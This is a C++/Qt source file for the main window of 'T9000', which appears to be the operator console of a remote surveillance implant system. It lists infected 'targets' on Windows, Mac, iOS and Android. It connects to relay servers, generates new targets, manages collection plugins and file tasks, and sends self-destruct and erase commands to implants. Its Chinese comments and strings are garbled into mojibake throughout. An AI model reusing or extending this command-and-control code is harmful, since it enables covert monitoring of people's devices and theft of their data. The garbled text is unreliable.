/*!
	Description : T9000 ������
	Author		: Ruining Song
	Date		: 2013.11.6
	Remark		:
*/

#include <assert.h>
#include <QSystemTrayIcon>
#include <QTimer>

#include "maindlg.h"
#include "conndlg.h"
#include "targetdlg.h"
#include "aliasdlg.h"
#include "generatedlg.h"
#include "daemondlg.h"
#include "nofocusstyle.h"
#include "policydlg.h"
#include "aboutdlg.h"
#include "waitdlg.h"
#include "logindatabasedlg.h"
#include "DlgContainer.h"
#include "MigrateDaemonDlg.h"
#include "flowcontroldlg.h"
#include "autogetdlg.h"
#include "configdlg.h"
#include "querydaemonaddressdlg.h"

#include "nofocusstyle.h"

#include "EventSelect.h"
#include "DatabaseManager.h"
#include "LocalDataDir.h"

#include "TargetConnection.h"
#include "ProcessFileTask.h"

#include "AdkPrecomp.h"
#include "AdkMD5.h"
#include "AdkBase64.h"
#include "adkrc4.h"
#include "adkFile.h"

#include "skin.h"

struct NotifyInfo
{
	unsigned int targetID;
	char title[256];
	char message[1024];
};

typedef bool (*NOTIFY_FUNC)(const char* cfgName, NotifyInfo* info);
NOTIFY_FUNC OnlineNotify = NULL;

// ////////////////////////////////////////////////////////////////////////////////
// ����������ݿ���߳�
//
class CleanDataBaseThread : public QThread
{
protected:
	void run()
	{
		DM->CleanDatabase();
		g_targetMap.clear();

		std::wstring dataPath = GetExePath()+L"\\Data";
		SHDel(dataPath.c_str());

		CreateDirectoryW(dataPath.c_str(), NULL);
	}
};


// ////////////////////////////////////////////////////////////////////////////////
// ȫ�ֱ�����Ϊ�˼��ݾɵĴ���
//
MainDlg* FrmMain = NULL;
ZlibUncompress g_zlibUncompress = NULL;

// ////////////////////////////////////////////////////////////////////////////////
// ���캯�� 
//
MainDlg::MainDlg(QWidget *parent, Qt::WFlags flags)
	: QMainWindow(parent, flags)
	, ctrOnlineFlag(false)
	, dataBlockCount(0)
	, dataBlockHeader(NULL)
	, bClosing(false)
	, ctrConn(NULL)
	, m_connDlg(this)
	, dwCtrUserId(0)		// �����ƶ˱���Ϊ 0
	, m_targetDlgContainer(NULL)
	, m_category(Category::GROUP)
	, m_displayMode(DisplayMode::SHOW_ALL)
	, m_iconToggle(false)
{
	//
	// ui ���
	//

	ui.setupUi(this);

	std::wstring notifyDll = GetExePath() + L"\\OnlineNotify.dll";

	HMODULE hDll = LoadLibraryW(notifyDll.c_str());

	if ( hDll )
	{
		OnlineNotify = (NOTIFY_FUNC)GetProcAddress(hDll, "OnlineNotifyFromCfg");
	}

	// waitdlg
	m_waitDlg = new WaitDlg(this);
	m_waitDlg->hide();

	// ������
	m_targetDlgContainer = new DlgContainer;
	m_tray = new QSystemTrayIcon(QApplication::windowIcon(), this);
	m_tray->show();
	m_trayFlashTimer =new QTimer(this);

	// ��ʼ���ؼ����
	InitWidgetAppearance();

	// ��ʼ���ź�&��
	InitConnection();

	// ΪĿ���б�����Ҽ��˵�
	ui.trTarget->setContextMenuPolicy(Qt::CustomContextMenu);

	//
	// �������
	//

	// ip ���ݿ�
	m_ipfinder.Open(WideToAnsi(GetExePath() + L"\\Config\\qqwry.dat").c_str());

	ZeroMemory(this->byPassMd5, 16 * sizeof(CHAR));

	ZeroMemory(this->MacPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));
	ZeroMemory(this->IosPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));
	ZeroMemory(this->WindowsPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));
	ZeroMemory(this->AndroidPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));

	InitializeCriticalSection(&csPlgDataBlock);
	hEventForPlgData = CreateEvent(NULL, false, false, NULL);

	// ����ȫ�ֱ��������ھ��
	FrmMain = this;
	Handle = (HWND)this->winId();

	// ��ʼ�� event select ģ��
	InitialEventSelect();

	// ��ʼ�� zlib
	WCHAR wzZlibPath[MAX_PATH] = {0};
	GetModuleFileNameW(0, wzZlibPath, MAX_PATH);
	LPWSTR wzName = wcsrchr(wzZlibPath, L'\\');
	wcscpy(wzName+1, L"zlib1.dll");
	HMODULE hLibrary = LoadLibrary(wzZlibPath);
	if (hLibrary)
	{
		g_zlibUncompress = (ZlibUncompress)GetProcAddress(hLibrary, "uncompress");
	}

	// ��ȡ�����ļ�
	ReadIniFile();

	// ��ȡ�����Ϣ
	ReadPluginInfo(WindowsPlgCxtVect);
	ReadPluginInfo(MacPlgCxtVect);
	ReadPluginInfo(IosPlgCxtVect);
	ReadPluginInfo(AndroidPlgCxtVect);


	// ������������߳�
	this->procDataThread = new ProcessDataThread();
	this->procDataThread->run();

	// ��ʼ�����ݿ�
	InitDatabase();

	// ��ʼ��Ŀ������
	InitialTargetData();

	// ���� '�Ͽ�����'
	//ui.mainToolBar->removeAction(ui.actStop);

	// �Զ���¼
	if ( this->bAutoLogin )
	{
		ConnectToDaemon();
	}

	// �����
	ui.trTarget->hideColumn(8);
}

// ////////////////////////////////////////////////////////////////////////////////
// �������� 
//
MainDlg::~MainDlg()
{
	//delete m_targetDlgContainer;
}

// ////////////////////////////////////////////////////////////////////////////////
// ��ʼ�����ݿ�
//
void MainDlg::InitDatabase()
{
	std::wstring iniPath = GetExePath() + L"\\setting.ini";
	std::wstring dbType = ReadStringPolicyFromLocal(L"Database", L"Type", iniPath.c_str());

	std::wstring connStr;

	if ( dbType == L"Access" )
		connStr = ReadStringPolicyFromLocal(L"Database", L"AccessConnStr", iniPath.c_str());
	else if ( dbType == L"SQL Server")
		connStr = ReadStringPolicyFromLocal(L"Database", L"SQLServerConnStr", iniPath.c_str());

	QString sqlConnStr = QString::fromStdWString(connStr);

	if ( dbType == L"Access" )
		DM = new DatabaseManager(connStr);
	else
	{
		std::wstring user;
		std::wstring password;
		LoginDatabaseDlg dlg(0, user, password);

		if ( QDialog::Accepted != dlg.exec() )
		{
			m_tray->hide();
			ExitProcess(-1);
		}

		DM = new DatabaseManager(connStr, user, password);
	}

	// ���������߳����������ݿ�
	dbThread = new QThread;
	DM->moveToThread(dbThread);
	dbThread->start();

	DM->UnitTest();

	FileTask* task = new FileTask;
	task->aniTmpTaskPath = "D:\\Projects\\Work\\Mixed\\T9000\\bin\\Data\\1420373341\\FileTasking\\5120558";
	task->dwTargetID = 1420373341;
	Target* tar = new Target;
	ProcessUserPluginData(task, tar);
}

// ////////////////////////////////////////////////////////////////////////////////
// @public pop plugin data block
//
PDATA_BLOCK MainDlg::PopPlgDataBlock()
{
	PDATA_BLOCK dataBlock = NULL;    
	EnterCriticalSection(&csPlgDataBlock);

	if (dataBlockHeader)
	{
		dataBlock = dataBlockHeader;
		dataBlockHeader = dataBlock->next;
		dataBlockCount--;        
	}

	LeaveCriticalSection(&csPlgDataBlock);
	return dataBlock;
}

// ////////////////////////////////////////////////////////////////////////////////
// @public push plugin data
//
void MainDlg::PushPlgDataBlock(PDATA_BLOCK dataBlock)
{
	EnterCriticalSection(&csPlgDataBlock);

	if (dataBlockHeader == NULL)
	{
		dataBlockHeader = dataBlock;
	}
	else
	{
		dataBlock->next = dataBlockHeader;
		dataBlockHeader = dataBlock;
	}

	dataBlockCount++;

	LeaveCriticalSection(&csPlgDataBlock);
	SetEvent(this->hEventForPlgData);    
	return;
}

// ////////////////////////////////////////////////////////////////////////////////
// @protected �ر��¼� 
//
void MainDlg::closeEvent(QCloseEvent *event)
{
	dbThread->exit(0);

	this->bClosing = true;

	m_tray->hide();
	ExitProcess(-1);

	// Close control connection
	//
	if (this->ctrConn != NULL)
	{
		this->ctrConn->CloseConnection();
		this->ctrConn = NULL;
	}

	// Close all filetransferthread
	//
	//ControlOffline();

	// Close data process thread

	if (procDataThread)
	{
		HANDLE hHandle = procDataThread->handle();
		SetEvent(this->hEventForPlgData);
		WaitForSingleObject(hHandle, INFINITE);
		CloseHandle(hHandle);
	}
	delete procDataThread;

	// Delete target
	//
	/*std::map<ULONG, Target *>::iterator i = g_targetMap.begin();
	for (; i != g_targetMap.end(); i++)
	{
		Target *tarBlock = (*i).second;
		if (NULL == tarBlock)
		{
			continue;
		}

		delete tarBlock;        
	}*/

	// �ر�ǰ�ȹر���������
	/*QWidget* dlg;
	foreach(dlg, m_targetWindowList)
	{
		if ( dlg )
		{
			dlg->close();
			delete dlg;
		}
	}*/
	m_targetDlgContainer->close();
	//delete m_targetDlgContainer;
}

// ////////////////////////////////////////////////////////////////////////////////
// @protected window ��Ϣ�ӹ�
//
bool MainDlg::winEvent(MSG *message, long *result)
{
	if ( message->message >= WM_CONTROL_CONNCOMPLETED )
	{
		switch ( message->message )
		{

		//
		// ������Ϣ
		//
		case WM_SET_STATUSINFO_A:
			on_WM_SET_STATUSINFO_A(message);
			break;

		case WM_SET_STATUSINFO_W:
			on_WM_SET_STATUSINFO_W(message);
			break;

		//
		// �������
		//
		case WM_CONTROL_CONNCOMPLETED:
			on_WM_CONTROL_CONNCOMPLETED(message);
			break;

		case WM_CONTROL_CONNFAILED:
			on_WM_CONTROL_CONNFAILED(message);
			break;

		case WM_CONTROL_CONNCLOSED:
			on_WM_CONTROL_CONNCLOSED(message);
			break;

		case WM_CONTROL_ONLINE:
			on_WM_CONTROL_ONLINE(message);
			break;

		case WM_CONTROL_PASSFAILED:
			on_WM_CONTROL_PASSFAILED(message);
			break;

		case WM_CONTROL_INOTHERPLACE:
			on_WM_CONTROL_INOTHERPLACE(message);
			break;
		
		//
		// Ŀ�����
		//
		case WM_NEW_TARGET:
			on_WM_NEW_TARGET(message);
			break;

		case WM_ERASE_TARGET:
			on_WM_ERASE_TARGET(message);
			break;

		case WM_TARGET_FOUND:
			on_WM_TARGET_FOUND(message);
			break;

		case WM_TARGET_STATUS_CHANGE:
			on_WM_TARGET_STATUS_CHANGE(message);
			break;

		case WM_TARGET_INFO_UPDATED:
			on_WM_TARGET_INFO_UPDATED(message);
			break;

		case WM_TARGET_EXINFO_UPDATED:
			on_WM_TARGET_EXINFO_UPDATED(message);
			break;

		case WM_TARGET_SWITCH:
			on_WM_TARGET_SWITCH(message);
			break;

		case WM_TARGET_DATACONNCLOSED:
			on_WM_TARGET_DATACONNCLOSED(message);
			break;

		// ��� target dialog
		case WM_ADD_TARGET_DIALOG:
			on_WM_ADD_TARGET_DIALOG(message);
			break;

		case WM_QUERY_DAEMONADDR_FINISHED:
			if ( m_qdaDlg != NULL )
				m_qdaDlg->OnQueryDaemonAddressFinished(message);

			break;

		case WM_QUERY_DAEMONADDR2_FINISHED:
			if ( m_qdaDlg != NULL )
				m_qdaDlg->OnQueryDaemonAddressFinished2(message);

			break;
		}

		return true;
	}

	// ������Ϣ���� Qt ����
	return false;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ����
//
void MainDlg::StartAction()
{

	m_connDlg.GetDaemonHistory();

	if ( QDialog::Accepted == m_connDlg.exec() )
	{
		this->bAutoLogin = m_connDlg.IsAutoConn();
		this->aniDaemonIpAddr = m_connDlg.GetIpAddress().toStdString();
		this->nCtrPortForControl = m_connDlg.GetCtrlPort().toInt();
		this->nDataPortForControl = m_connDlg.GetTargetPort().toInt();

		// ������֤���MD5ֵ
		std::string aniPass = m_connDlg.GetPass().toStdString();

		char* buffer = new char[aniPass.length()];
		memcpy(buffer, aniPass.c_str(), aniPass.length());

		MD5_CTX context;
		AdkMD5Init (&context);
		AdkMD5Update (&context, (BYTE*)buffer, aniPass.length());
		AdkMD5Final (&context, this->byPassMd5);

		delete buffer;

		// д�����ļ�
		WriteIniFile();

		m_connDlg.ApplyDaemonHistory();

		// ��������ת
		ConnectToDaemon();
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ֹͣ
//
void MainDlg::StopAction()
{
	if (this->ctrConn)
	{
		this->ctrConn->CloseConnection();
		this->ctrConn = NULL;
		qDebug() << "1";
		ControlOffline();
		qDebug() << "2";
	}

	AddStatusInfo(STATUS_INFO, "�����Ͽ�����ת������������");
	ui.statusBar->showMessage(QString::fromLocal8Bit("�����Ͽ�����ת������������"));

	//ui.mainToolBar->removeAction(ui.actStop);
	//ui.mainToolBar->insertAction(ui.actConfig, ui.actStart);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot Ǩ����ת
//
void MainDlg::MigrateDaemonAction()
{
	if ( !this->ctrOnlineFlag )
	{
		MessageBoxW((HWND)winId(), L"[�ѻ����ݲ鿴ģʽ] �²��ܽ�����ת��������Ǩ��!", L"��ʾ", MB_OK | MB_ICONINFORMATION);
		return;
	}

	MigrateDaemonDlg dlg;
	if ( QDialog::Accepted == dlg.exec() )
	{
		std::wstring newDaemonAddress = dlg.GetNewDaemonAddress();
		WCHAR msg[MAX_PATH] = {0};
		wsprintfW(msg, L"�ɹ�����ת������Ǩ���� %s ...", newDaemonAddress.c_str());
		AddStatusInfo(STATUS_INFO, msg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot �˳�
//
void MainDlg::ExitAction()
{
	close();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �������
//
void MainDlg::ConfigAction()
{
	ConfigDlg dlg;
	dlg.exec();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���ò������
//
void MainDlg::PolicyAction()
{
	//if ( 0 == ui.trTarget->selectedItems().count()
	//	|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	//{
	//	QMessageBox::critical(
	//		this,
	//		QString::fromLocal8Bit("��ʾ"),
	//		QString::fromLocal8Bit("��ѡ��һ��Ŀ��"));
	//	return;
	//}

	QTreeWidgetItem* item = ui.trTarget->selectedItems()[0];
	Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();

	ModifyPluginPolicy((unsigned int)tarBlock, 0);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ����Ŀ�����
//
void MainDlg::AliasAction()
{
	//if ( 0 == ui.trTarget->selectedItems().count()
	//	|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	//{
	//	QMessageBox::critical(
	//		this,
	//		QString::fromLocal8Bit("��ʾ"),
	//		QString::fromLocal8Bit("��ѡ��һ��Ŀ��"));
	//	return;
	//}

	QTreeWidgetItem* item = ui.trTarget->selectedItems()[0];

	int targetId = item->text(0).toInt();
	std::string oldAlias = item->text(1).toLocal8Bit();

	AliasDlg dlg(this, targetId);
	dlg.SetTargetAlias(QString::fromLocal8Bit(oldAlias.c_str()));

	if ( QDialog::Accepted == dlg.exec() )
	{
		// ���½���
		QString newAlias = dlg.GetTargetAlias();
		item->setText(1, newAlias);
		item->setText(0, newAlias);

		// ���� target
		Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
		tar->aniTargetName = newAlias.toLocal8Bit();

		// �������ݿ�
		DM->UpdateTargetInfo(tar);

		if ( m_targetDlgContainer )
			m_targetDlgContainer->ChangeLabelText(tar->dwTargetID, newAlias);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot �ղ�
//
void MainDlg::FavoriteAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("��ѡ��һ��Ŀ��"));
		return;
	}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];

	if ( item->parent() != NULL )
	{
		Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();

		if ( ui.actFavorite->text() == QString::fromLocal8Bit("�ղ�Ŀ��") )
		{
			tarBlock->m_favorite = true;
			item->setIcon(11, QIcon(QPixmap("image/star.png")));
			ui.actFavorite->setText(QString::fromLocal8Bit("ȡ���ղ�"));
		}
		else
		{
			tarBlock->m_favorite = false;
			item->setIcon(11, QIcon());
			ui.actFavorite->setText(QString::fromLocal8Bit("�ղ�Ŀ��"));

			if ( DisplayMode::SHOW_FAVORITE == m_displayMode )
			{
				QTreeWidgetItem* parent = item->parent();
				parent->takeChild(parent->indexOfChild(item));

				if ( 0 == parent->childCount() )
					ui.trTarget->takeTopLevelItem(ui.trTarget->indexOfTopLevelItem(parent));
				else
					ui.actFavorite->setText(QString::fromLocal8Bit("ȡ���ղ�"));
			}
		}

		DM->UpdateTargetFavoriteStatus(tarBlock->dwTargetID, tarBlock->m_favorite);
		//RefreshTargetList();
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot �Ի�
//
void MainDlg::DelSelfAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("��ѡ��һ��Ŀ��"));
		return;
	}

	if (ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("ֻ������������ģʽ�²����Ի�Ŀ��!")
			);
		return;
	}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];

	if ( item->parent() != NULL )
	{
		Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();
		if (tarBlock->tarStatus == TAROFFLINE)
		{
			MsgBoxInfoExW(this->Handle, L"���ܶ�����Ŀ�귢���Ի�ָ��!");
			return;
		}

		if (tarBlock->QueryFileTasking())
		{
			MsgBoxInfoExW(this->Handle, L"�Ի�Ŀ��ǰ,����ȡ��Ŀ��������ļ���������!");
			return;
		}

		if (IDYES == MessageBox(this->Handle,L"�Ƿ��´��Ի�ָ���ȷ��!",L"ȷ��", MB_YESNO | MB_ICONWARNING))
		{
			if (this->ctrConn)
			{
				this->ctrConn->Send_SDS(tarBlock->dwTargetID);
			}
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ��������
//
void MainDlg::FlowControlAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("��ѡ��һ��Ŀ��"));
		return;
	}

	if (ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("ֻ������������ģʽ�²����޸��������Ʋ���!")
			);
		return;
	}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];
	Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();

	FlowControlDlg dlg(tarBlock);
	dlg.exec();
}


// ////////////////////////////////////////////////////////////////////////////////
// @private slot ���Ŀ������
//
void MainDlg::CleanAction()
{
	//if ( 0 == ui.trTarget->selectedItems().count() )
	//{
	//	QMessageBox::critical(
	//		this,
	//		QString::fromLocal8Bit("��ʾ"),
	//		QString::fromLocal8Bit("��ѡ��һ��Ŀ��"));
	//	return;
	//}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];

	//if ( item->parent() != NULL )
	//{
		Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();

		if (ctrOnlineFlag == false)
		{
			DM->CleanTargetData(tarBlock->dwTargetID);
			WCHAR dataDir[MAX_PATH] = {0};
			wsprintf(dataDir, L"%s\\Data\\%d", GetExePath().c_str(), tarBlock->dwTargetID);
			SHDel(dataDir);
			//QTreeWidgetItem* parent = item->parent();
			//parent->takeChild(parent->indexOfChild(item));

			//for ( std::list<QTreeWidgetItem*>::iterator it = m_itemList.begin();
			//	it != m_itemList.end();
			//	 )
			//{
			//	if ( *it == item )
			//		it = m_itemList.erase(it);
			//	else
			//		++it;
			//}

			//RemoveTargetFromGlobalMap(tarBlock->dwTargetID);

			//if ( 0 == parent->childCount() )
			//	ui.trTarget->takeTopLevelItem(ui.trTarget->indexOfTopLevelItem(parent));

			//UpateTargetCount();
			ui.trTarget->takeTopLevelItem(ui.trTarget->indexOfTopLevelItem(item));

			return;
		}

		if (tarBlock->tarStatus == TARONLINE)
		{
			MsgBoxInfoExW(this->Handle, L"����״̬�²������Ŀ��!");
			return;
		}

		if (tarBlock->QueryFileTasking())
		{
			MsgBoxInfoExW(this->Handle, L"���Ŀ��ǰ,����ȡ��Ŀ��������ļ���������!");
			return;
		}

		if (IDYES == MessageBox(this->Handle,L"�Ƿ������Ŀ�꼰�������ݣ���ȷ��!",L"ȷ��",MB_YESNO | MB_ICONWARNING))
		{
			tarBlock->bCleared = true;

			// �ȶ�����
			//
			if (tarBlock->tarConn)
			{
				tarBlock->tarConn->CloseConnection();
				tarBlock->tarConn = NULL;
			}

			// �����
			//
			this->ctrConn->Send_ERA(tarBlock->dwTargetID);
		}
	//}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ����Ŀ���
//
void MainDlg::CreateTargetAction()
{
	GenerateDlg dlg;
	dlg.exec();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ������ת
//
void MainDlg::CreateDaemonAction()
{
	DaemonDlg dlg;
	dlg.exec();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ������ݿ�
//
void MainDlg::CleanDatabaseAction()
{

	if ( 0 != ui.trTarget->selectedItems().count() 
		&& ui.trTarget->selectedItems()[0]->parent() != NULL )
	{
		CleanAction();
		return;
	}

	if ( this->ctrOnlineFlag )
	{
		MsgBoxInfoExW(Handle, L"������ݿ�֮ǰ��Ҫ�Ͽ�����!");
		return;
	}

	ui.trTarget->clear();

	CleanDataBaseThread* thread = new CleanDataBaseThread;
	WaitDlg* dlg = new WaitDlg(ui.trTarget);
	dlg->show();
	connect(thread, SIGNAL(finished()), dlg, SLOT(close()));
	thread->start();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ��ѯ��ת������Ϣ
//
void MainDlg::QueryDaemonAddressAction()
{
	if ( 0 == ui.trTarget->selectedItems().count()
		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
	{
		QMessageBox::critical(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("��ѡ��һ��Ŀ��"));
		return;
	}

	if (ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("ֻ������������ģʽ�²��ܲ�ѯ��ת������Ϣ!")
			);
		return;
	}

	QTreeWidgetItem * item = ui.trTarget->selectedItems()[0];

	if ( item->parent() != NULL )
	{
		Target* tarBlock = (Target*)item->data(0, Qt::UserRole).toUInt();
		if (tarBlock->tarStatus == TAROFFLINE)
		{
			MsgBoxInfoExW(this->Handle, L"���ܶ�����Ŀ���ѯ��ת������Ϣ!");
			return;
		}

		m_qdaDlg = new QueryDaemonAddressDlg(this, tarBlock);
		m_qdaDlg->exec();

		delete m_qdaDlg;
		m_qdaDlg = NULL;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ʹ��ָ��
//
void MainDlg::HelpAction()
{

}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot ����
//
void MainDlg::AboutAction()
{

	//AboutDlg dlg(this);
	//dlg.exec();
	std::wstring inifile = GetExePath() + L"\\setting.ini";
	std::wstring title = ReadStringPolicyFromLocal(L"Application", L"about", inifile.c_str());

	WCHAR info[1024] = {0};
	wsprintfW(info, L"��Ʒ���� : %s\r\n��Ȩ���� : �Ͼ��ؽ���Ϣ�������޹�˾", title.c_str());

	QMessageBox about(
		QMessageBox::Information, 
		QString::fromLocal8Bit("����"),
		QString::fromStdWString(std::wstring(info)),
		QMessageBox::Ok, 
		this);

	about.exec();
	/*MessageBoxW(this->winId(), L"��Ʒ���� : �ؽ����΢��ƽ̨��Զ����Ϣȡ֤ϵͳ��� v1.0\r\n"
		L"��Ȩ���� : �Ͼ��ؽ���Ϣ�������޹�˾", L"��ʾ", MB_OK | MB_ICONINFORMATION);*/
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �����־��Ϣ
//
void MainDlg::on_WM_SET_STATUSINFO_A(MSG* msg)
{
	STATUS_LEVEL sl = (STATUS_LEVEL)msg->wParam;
	char *lpszInfo = (char *)msg->lParam;

	AddStatusInfo(sl, lpszInfo);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private
//
void MainDlg::on_WM_SET_STATUSINFO_W(MSG* msg)
{
	STATUS_LEVEL sl = (STATUS_LEVEL)msg->wParam;
	wchar_t *lpwzInfo = (wchar_t *)msg->lParam;

	AddStatusInfo(sl, lpwzInfo);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���ƶ����ӽ���
//
void MainDlg::on_WM_CONTROL_CONNCOMPLETED(MSG* msg)
{
	this->ctrConn = (ControlConnection *)msg->wParam;
	ui.statusBar->showMessage(QString::fromLocal8Bit("�ɹ�������ת������"));
	AddStatusInfo(STATUS_INFO, L"�ɹ�������ת������");
	ui.actStop->setEnabled(true);
	ui.actStart->setEnabled(false);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���ƶ�����ʧ��
//
void MainDlg::on_WM_CONTROL_CONNFAILED(MSG* msg)
{
	int iErrorCode = msg->wParam;

	switch(iErrorCode)
	{
	case WSAECONNREFUSED:
		ui.statusBar->showMessage(QString::fromLocal8Bit("����������ת������!  ���ӱ��ܾ�"));
		AddStatusInfo(STATUS_ERROR, L"����������ת������!  ���ӱ��ܾ�");
		break;
	default:
		ui.statusBar->showMessage(QString::fromLocal8Bit("����������ת������!  ��ȷ����ת�������Ƿ���������"));
		AddStatusInfo(STATUS_ERROR, L"����������ת������!  ��ȷ����ת�������Ƿ���������");
		break;
	}
	
	ControlOffline();

	ui.actStart->setEnabled(true);
	ui.actStop->setEnabled(false);

	m_waitDlg->hide();

	StartAction();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���ƶ����ӹر�
//
void MainDlg::on_WM_CONTROL_CONNCLOSED(MSG* msg)
{
	if (this->ctrConn == NULL)
	{
		return;
	}

	ControlOffline();

	QMessageBox::critical(this,
		QString::fromLocal8Bit("����"),
		QString::fromLocal8Bit("����ת�������������ж�!  ��ȷ����ת�������Ƿ���������"));

	AddStatusInfo(STATUS_ERROR, L"����ת�������������ж�!  ��ȷ����ת�������Ƿ���������");    
	ui.statusBar->showMessage(QString::fromLocal8Bit("����ת�������������ж�!  ��ȷ����ת�������Ƿ���������"));

	ui.actStop->setEnabled(false);
	ui.actStart->setEnabled(true);

	UpateTargetCount();
	StartAction();

	//ui.mainToolBar->removeAction(ui.actStop);
	//ui.mainToolBar->insertAction(ui.actConfig, ui.actStart);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���ƶ�����
//
void MainDlg::on_WM_CONTROL_ONLINE(MSG* msg)
{
	if (this->ctrConn == NULL)
	{
		// ����������������˵�������ʱ��㣬�û�����˶Ͽ�����
		//
		return;
	}

	this->ctrOnlineFlag = true;
	AddStatusInfo(STATUS_NOTE, L"��֤����֤ͨ��,������������ģʽ");
	ui.statusBar->showMessage(QString::fromLocal8Bit("��֤����֤ͨ��,������������ģʽ"));

	// ��ʱ����������
	m_PNGTimer.start(30*1000);

	m_waitDlg->hide();
	//ui.mainToolBar->removeAction(ui.actStart);
	//ui.mainToolBar->insertAction(ui.actConfig, ui.actStop);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �������
//
void MainDlg::on_WM_CONTROL_PASSFAILED(MSG* msg)
{
	this->ctrConn->CloseConnection();
	ControlOffline();

	ui.statusBar->showMessage(QString::fromLocal8Bit("��ת��������֤ʧ��!\r\n��֤�벻��ȷ"));

	m_waitDlg->hide();

	QMessageBox::critical(this,
		QString::fromLocal8Bit("����"),
		QString::fromLocal8Bit("��ת��������֤ʧ��!\r\n��֤�벻��ȷ"));
	AddStatusInfo(STATUS_INFO, L"��ת��������֤ʧ��!��֤�벻��ȷ");

	StartAction();
	
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �����û���¼
//
void MainDlg::on_WM_CONTROL_INOTHERPLACE(MSG* msg)
{
	if (this->ctrConn == NULL)
	{
		return;
	}

	this->ctrConn->CloseConnection();
	ControlOffline();


	QMessageBox::critical(this,
		QString::fromLocal8Bit("����"),
		QString::fromLocal8Bit("����ת�������������ж�!  ��һ�����ƶ˵�¼����ת������"));
	ui.statusBar->showMessage(QString::fromLocal8Bit("����ת�������������ж�!  ��һ�����ƶ˵�¼����ת������"));
	AddStatusInfo(STATUS_ERROR, L"����ת�������������ж�!  ��һ�����ƶ˵�¼����ת������");

	StartAction();

	//ui.mainToolBar->removeAction(ui.actStop);
	//ui.mainToolBar->insertAction(ui.actConfig, ui.actStart);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��Ŀ������
//
void MainDlg::on_WM_NEW_TARGET(MSG* msg)
{
	Target *tar = (Target *)msg->wParam;

	g_targetMap[tar->dwTargetID] = tar;     // ���ӵ�MAP��
	DM->AddTarget(tar);                     // ���µ����ݿ���
	tar->CheckAndCreateDataDir();           // ��鼰������������Ŀ¼
	AddTargetNode(tar);                     // ���ӵ�������
}

// ////////////////////////////////////////////////////////////////////////////////
// @private Ŀ�����
//
void MainDlg::on_WM_ERASE_TARGET(MSG* msg)
{
	ULONG targetId = msg->wParam;
	ULONG ret      = msg->lParam;

	if (ret == 1)
	{
		Target * tarBlock = GetTargetFromGlobalMap(targetId);
		if (tarBlock)
		{
			if (tarBlock->frmTarControl)
			{
				tarBlock->frmTarControl->close();
				tarBlock->frmTarControl = NULL;
			}

			g_targetMap.erase(tarBlock->dwTargetID);
			DM->ClearAndRemoveTarget(tarBlock->dwTargetID);

			// Remove tNode from target TreeView
			//            
			tarBlock->treeNode->parent()->removeChild(tarBlock->treeNode);
			delete tarBlock;
		}
	}
	else
	{
		QMessageBox::critical(this, QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("��Ŀ�����ߣ��������Ŀ��!"));        
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����Ŀ��
//
void MainDlg::on_WM_TARGET_FOUND(MSG* msg)
{
	Target *tar = (Target *)msg->wParam;

